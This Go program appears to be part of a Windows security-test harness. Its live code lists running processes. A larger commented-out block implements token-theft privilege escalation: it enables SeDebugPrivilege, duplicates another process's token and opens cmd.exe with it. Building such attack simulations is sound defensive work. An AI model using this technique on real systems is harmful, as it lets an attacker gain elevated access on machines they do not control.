package main

import (
	"fmt"
	"os/exec"
	"runtime"
	"strings"
)

/*"helpers"
"os"
"strconv"
"unsafe"

"golang.org/x/sys/windows"*/

const (
	TokenQuery                    = 0x0008
	TokenAdjustDefault            = 0x0080
	TokenAdjustIntegrity          = 0x0200
	SECURITY_MANDATORY_MEDIUM_RID = 0x00002000
)

/*type TOKEN_MANDATORY_LABEL struct {
	Label windows.SIDAndAttributes
}*/

func main() {
	currOS := runtime.GOOS
	if currOS == "windows" {
		cmd := exec.Command("tasklist", "/NH")
		processes, err := cmd.Output()
		if err != nil {
			fmt.Println(err)
		}

		pids := strings.Fields(string(processes))
		fmt.Println(pids[:13])

	}
	/*nameOfLogFile := helpers.CreateLogFileIfItDoesNotExist("./", "PrivEsc")
	helpers.WriteLog(nameOfLogFile, "Ending Test: EscalateToken", 2)
	kernel := windows.NewLazyDLL("advapi32.dll")
	setTok := kernel.NewProc("SetTokenInformation")
	newProc := kernel.NewProc("CreateProcessWithTokenW")

	handle, err := windows.OpenProcess(uint32(windows.PROCESS_QUERY_LIMITED_INFORMATION), false, windows.GetCurrentProcessId())
	if err != nil {
		helpers.WriteLog(nameOfLogFile, err.Error(), 1)
		os.Exit(2)
	}

	var tokCurrProc windows.Token

	err = windows.OpenProcessToken(handle, uint32(windows.TOKEN_ADJUST_PRIVILEGES), &tokCurrProc)
	if err != nil {
		helpers.WriteLog(nameOfLogFile, err.Error(), 1)
		os.Exit(3)
	}

	var luid windows.LUID

	err = windows.LookupPrivilegeValue(nil, windows.StringToUTF16Ptr("SeDebugPrivilege"), &luid)
	if err != nil {
		helpers.WriteLog(nameOfLogFile, err.Error(), 1)
		os.Exit(4)
	}

	tp := new(windows.Tokenprivileges)
	tp.PrivilegeCount = 1
	tp.Privileges[0].Luid = luid
	tp.Privileges[0].Attributes = windows.SE_PRIVILEGE_ENABLED

	err = windows.AdjustTokenPrivileges(tokCurrProc, false, tp, uint32(unsafe.Sizeof(tp)), nil, nil)
	if err != nil {
		helpers.WriteLog(nameOfLogFile, err.Error(), 1)
		os.Exit(5)
	}

	pidToDuplicate, _ := strconv.Atoi(os.Args[1])
	handle1, err := windows.OpenProcess(uint32(windows.PROCESS_QUERY_LIMITED_INFORMATION), false, uint32(pidToDuplicate))
	if err != nil {
		helpers.WriteLog(nameOfLogFile, err.Error(), 1)
		os.Exit(6)
	}

	var tokTarg, dupTokHand windows.Token
	err = windows.OpenProcessToken(handle1, uint32(windows.TOKEN_DUPLICATE), &tokTarg)
	if err != nil {
		helpers.WriteLog(nameOfLogFile, err.Error(), 1)
		os.Exit(7)
	}

	err = windows.DuplicateTokenEx(tokTarg, windows.TOKEN_ADJUST_DEFAULT|windows.TOKEN_QUERY|windows.TOKEN_ADJUST_SESSIONID|windows.TOKEN_DUPLICATE|windows.TOKEN_ASSIGN_PRIMARY, nil, windows.SecurityImpersonation, windows.TokenPrimary, &dupTokHand)
	if err != nil {
		helpers.WriteLog(nameOfLogFile, err.Error(), 1)
		os.Exit(8)
	}

	var tml TOKEN_MANDATORY_LABEL
	var sid = new(windows.SID)
	windows.ConvertStringSidToSid(windows.StringToUTF16Ptr("S-1-16-8192"), &sid)
	tml.Label.Sid = sid
	tml.Label.Attributes = windows.SE_GROUP_INTEGRITY

	_, _, err = setTok.Call(uintptr(dupTokHand), windows.TokenIntegrityLevel, uintptr(unsafe.Pointer(&tml)), uintptr(unsafe.Sizeof(tml)))
	if err != nil {
		if err.Error() != "The operation completed successfully." {
			helpers.WriteLog(nameOfLogFile, err.Error(), 1)
			os.Exit(9)
		}
	}

	var startInfo windows.StartupInfo
	var procInfo windows.ProcessInformation

	_, _, err = newProc.Call(uintptr(dupTokHand), 0, uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("C:\\Windows\\System32\\cmd.exe"))), 0, 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&startInfo)), uintptr(unsafe.Pointer(&procInfo)))
	if err != nil {
		helpers.WriteLog(nameOfLogFile, err.Error(), 1)
		os.Exit(1)
	}

	helpers.WriteLog(nameOfLogFile, "Ending Test: EscalateToken", 2)
	os.Exit(0)*/
}
